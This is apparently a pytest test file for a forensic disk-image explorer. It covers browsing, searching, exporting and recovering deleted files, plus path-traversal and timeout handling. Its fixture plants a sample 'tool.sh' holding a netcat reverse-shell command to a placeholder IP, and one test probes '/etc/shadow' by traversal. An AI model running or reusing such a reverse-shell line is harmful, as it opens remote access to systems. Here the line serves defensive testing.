from __future__ import annotations

import hashlib
import io
import json
from pathlib import Path
import subprocess
import zipfile

import pytest
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

from app.core.database import Base
from app.models.case import Case
from app.models.disk_image import DiskImage, DiskVolume
from app.models.evidence import Evidence, EvidenceStorageMode, EvidenceType, IngestStatus
from app.services import disk_file_explorer
from app.services.disk_file_explorer import DiskFileExplorerError, export_files, find_files, list_directory, list_volumes


CASE_ID = "11111111-1111-1111-1111-111111111111"
EVIDENCE_ID = "22222222-2222-2222-2222-222222222222"


def _require_tools(*names: str) -> None:
    missing = [name for name in names if subprocess.run(["bash", "-lc", f"command -v {name} >/dev/null 2>&1"], check=False).returncode != 0]
    if missing:
        pytest.skip(f"Missing required tool(s): {', '.join(missing)}")


@pytest.fixture
def db():
    engine = create_engine("sqlite:///:memory:", future=True)
    Base.metadata.create_all(bind=engine)
    session = sessionmaker(bind=engine, autoflush=False, autocommit=False, expire_on_commit=False, future=True)()
    try:
        yield session
    finally:
        session.close()


def _evidence(db, image: Path, *, image_format: str = "raw", readable: bool = True) -> tuple[Evidence, DiskVolume]:
    db.add(Case(id=CASE_ID, name="Files"))
    evidence = Evidence(
        id=EVIDENCE_ID, case_id=CASE_ID, original_filename=image.name, stored_path=str(image), original_path=str(image),
        storage_mode=EvidenceStorageMode.uploaded, is_external=False, copy_to_storage=True, evidence_type=EvidenceType.disk_image,
        sha256=None, size_bytes=image.stat().st_size if image.exists() else 0, ingest_status=IngestStatus.completed,
        path_validation={}, ingest_source={}, metadata_json={}, error_log={},
    )
    db.add(evidence)
    db.flush()
    disk_image = DiskImage(evidence_id=evidence.id, original_filename=image.name, format=image_format, size_bytes=evidence.size_bytes, status="completed")
    db.add(disk_image)
    db.flush()
    volume = DiskVolume(disk_image_id=disk_image.id, partition_index=0, offset_bytes=0, length_bytes=evidence.size_bytes, filesystem_type="fat16", readable=readable, status="discovered")
    db.add(volume)
    db.commit()
    return evidence, volume


def _fat_image(tmp_path: Path) -> Path:
    _require_tools("mkfs.vfat", "mcopy", "mmd", "mdel")
    image = tmp_path / "disk.img"
    subprocess.run(["mkfs.vfat", "-C", str(image), "8192"], check=True, capture_output=True)
    source = tmp_path / "src"
    source.mkdir()
    files = {"tool.sh": b"#!/bin/sh\nnc -e /bin/sh 203.0.113.5 4444\n", "gone.txt": b"exfiltrated secrets\n" * 50, "passwd": b"root:x:0:0:root:/root:/bin/bash\n"}
    for name, content in files.items():
        (source / name).write_bytes(content)
    for directory in ("tmp", "etc"):
        subprocess.run(["mmd", "-i", str(image), f"::/{directory}"], check=True, capture_output=True)
    subprocess.run(["mcopy", "-i", str(image), str(source / "tool.sh"), "::/tmp/tool.sh"], check=True, capture_output=True)
    subprocess.run(["mcopy", "-i", str(image), str(source / "gone.txt"), "::/tmp/gone.txt"], check=True, capture_output=True)
    subprocess.run(["mcopy", "-i", str(image), str(source / "passwd"), "::/etc/passwd"], check=True, capture_output=True)
    subprocess.run(["mdel", "-i", str(image), "::/tmp/gone.txt"], check=True, capture_output=True)
    return image


def test_browse_find_and_export_live_and_deleted_files(db, tmp_path, monkeypatch):
    _require_tools("7z")
    image = _fat_image(tmp_path)
    monkeypatch.setattr(disk_file_explorer, "_temp_root", lambda: tmp_path)
    evidence, volume = _evidence(db, image)

    listing = list_directory(db, evidence, volume.id, path="/tmp", inode=None)
    by_status = {entry["status"]: entry for entry in listing["entries"]}
    live = next(entry for entry in listing["entries"] if entry["name"].lower() == "tool.sh")
    assert live["status"] == "allocated" and live["size"] == 41
    deleted = by_status["deleted"]

    found = find_files(db, evidence, volume.id, pattern="*.sh", path=None, include_deleted=False)
    assert [entry["path"].lower() for entry in found["results"]] == ["/tmp/tool.sh"]

    archive, summary = export_files(db, evidence, volume.id, items=[{"path": live["path"]}, {"path": deleted["path"], "inode": deleted["inode"]}, {"path": "/etc"}], include_deleted=False)
    results = {item["path"].lower(): item for item in summary["files"]}
    assert results["/tmp/tool.sh"]["result"] == "exported"
    assert results[deleted["path"].lower()]["result"] == "recovered"
    assert results["/etc/passwd"]["result"] == "exported"
    with zipfile.ZipFile(io.BytesIO(archive.read_bytes())) as bundle:
        assert all(info.flag_bits & 0x1 for info in bundle.infolist() if not info.is_dir())  # every file is encrypted
        with pytest.raises(RuntimeError):
            bundle.read(results["/tmp/tool.sh"]["archive_path"])
        recovered = bundle.read(results[deleted["path"].lower()]["archive_path"], pwd=b"infected")
        manifest = json.loads(bundle.read("kairon-export.json", pwd=b"infected"))
    assert recovered == b"exfiltrated secrets\n" * 50
    assert results[deleted["path"].lower()]["sha256"] == hashlib.sha256(recovered).hexdigest()
    assert manifest["evidence_id"] == EVIDENCE_ID


def test_export_trusts_the_filesystem_not_the_request(db, tmp_path, monkeypatch):
    _require_tools("7z")
    image = _fat_image(tmp_path)
    monkeypatch.setattr(disk_file_explorer, "_temp_root", lambda: tmp_path)
    evidence, volume = _evidence(db, image)
    # A forged status or an inode that does not match the name is ignored.
    _, summary = export_files(db, evidence, volume.id, items=[{"path": "/tmp/tool.sh", "inode": 999999, "status": "allocated"}], include_deleted=False)
    assert summary["files"][0]["result"] == "skipped"


def test_volumes_that_cannot_be_browsed_say_why(db, tmp_path):
    image = tmp_path / "disk.vmdk"
    image.write_bytes(b"\0" * 1024)
    evidence, volume = _evidence(db, image, image_format="vmdk")
    listing = list_volumes(db, evidence)
    assert listing["volumes"][0]["browsable"] is False
    assert "VMDK" in listing["volumes"][0]["unavailable_reason"]
    with pytest.raises(DiskFileExplorerError) as error:
        list_directory(db, evidence, volume.id, path="/", inode=None)
    assert error.value.status_code == 409


def test_paths_cannot_climb_out_of_the_volume(db, tmp_path):
    image = tmp_path / "disk.img"
    image.write_bytes(b"\0" * 1024)
    evidence, volume = _evidence(db, image)
    with pytest.raises(DiskFileExplorerError) as error:
        export_files(db, evidence, volume.id, items=[{"path": "/tmp/../../etc/shadow"}], include_deleted=False)
    assert error.value.code == "invalid_path"


def test_a_hung_reader_is_stopped(db, tmp_path, monkeypatch):
    image = tmp_path / "disk.img"
    image.write_bytes(b"\0" * 1024)
    evidence, volume = _evidence(db, image)

    def hang(*args, **kwargs):
        raise subprocess.TimeoutExpired(cmd=args[0], timeout=kwargs.get("timeout"))

    monkeypatch.setattr(disk_file_explorer.subprocess, "run", hang)
    with pytest.raises(DiskFileExplorerError) as error:
        list_directory(db, evidence, volume.id, path="/", inode=None)
    assert (error.value.status_code, error.value.code) == (504, "explorer_timeout")
